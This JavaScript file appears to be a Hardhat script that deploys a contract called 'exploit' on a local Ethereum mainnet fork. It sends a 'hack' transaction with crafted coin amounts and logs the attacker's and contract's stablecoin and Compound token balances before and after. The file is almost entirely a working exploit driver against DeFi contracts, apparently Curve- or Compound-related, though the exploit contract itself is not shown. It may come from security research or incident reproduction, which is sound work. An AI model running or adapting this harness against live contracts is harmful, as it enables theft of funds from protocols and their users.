const { exec } = require('./utilities.js')
const hre = require("hardhat");
const ethers = require('ethers');

const privatekey = '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80'
const pubkey = '0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266'
const erc20Abi = [{ "constant": true, "inputs": [{ "name": "_owner", "type": "address"}],"name": "balanceOf","outputs": [{"name": "balance","type": "uint256"}],"payable": false,"type": "function"}]
const url = "http://127.0.0.1:8545/"
const ethersOptions = { gasLimit: 9000000, gasPrice: 0};
					
const provider = new ethers.providers.JsonRpcProvider(url);
let wallet = new ethers.Wallet(privatekey, provider);
let coins = [ethers.BigNumber.from("1671366519637560").add(1000000),ethers.BigNumber.from("3153232734120070").add(1000000), ethers.BigNumber.from("391505527561").add(1000000)]

let tokens = {
	'dai': "0x6B175474E89094C44Da98b954EedeAC495271d0F",
	'usdc': "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
	'usdt': "0xdAC17F958D2ee523a2206206994597C13D831ec7",
	//'curve_pool_token': "0x5A86Ff42902006E8C9cFeAD126E71E418dCc0459",
	'cusdt:': "0xf650C3d88D12dB855b8bf7D11Be6C55A4e07dCC9",
	'cdai': "0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643",
	'cusdc': "0x39AA39c021dfbaE8faC545936693aC917d5E7563"
}

async function ourStatus(contractAddr) {
	console.log('On Ethereum mainnet block', (await provider.getBlock()).number)
	console.log('On Ethereum mainnet hash', (await provider.getBlock()).hash)
	console.log('our wallet:', pubkey)
	console.log('  ETH:', (await wallet.getBalance()).toString());
	
	for (var key in tokens) {
		const contract = new ethers.Contract(tokens[key], erc20Abi, provider);
		console.log('  ',key,':', (await contract.balanceOf(pubkey)).toString())	
	}
	console.log('contract:', contractAddr)
	console.log('  ETH:', (await provider.getBalance(contractAddr)).toString());
	for (var key in tokens) {
		const contract = new ethers.Contract(tokens[key], erc20Abi, provider);
		console.log('  ',key,':', (await contract.balanceOf(contractAddr)).toString())	
	}
	
}


async function f() {

	console.log('DEPLOYING EXPLOIT')
	const Exploit = await hre.ethers.getContractFactory('exploit',wallet);
	const exploit = await Exploit.deploy(ethersOptions);
	let exploitContract = await exploit.deployed();
	const callOptions = { gasLimit: 9000000, gasPrice: 0, value: ethers.utils.parseEther('3')};
	
	await ourStatus(exploitContract.address)
	
	console.log('SENDING HACK TRANSACTION')
	
	
	exploitContract.hack(coins, "0", "1", ethers.utils.parseEther('10000'),callOptions ).then(function(tx) {
		//console.log(tx);
		return tx.wait(1).then((receipt) => {
			//console.log('confirmed!')
			//console.log(receipt)
			//let events = receipt.logs.map((log) => exploit.interface.parseLog(log))
			//for (var i = 0; i < events.length; i++) {
			//	console.log('\n')
			//	console.log(events[i].name)
			//	for (var a = 0; a < events[i].args.length; a++) {
			//		console.log(ethers.BigNumber.from(events[i].args[a]).toString())
			//	}
			//}
			//console.log(events)
			console.log('EXPLOIT COMPLETE')
			ourStatus(exploitContract.address)
		}).catch(function(e) {
			console.log(e)
		})
	}, function(e) {
		console.log(e)
		console.log('hello')
	})
	
	
}
console.log('STARTING EXPLOIT')
f()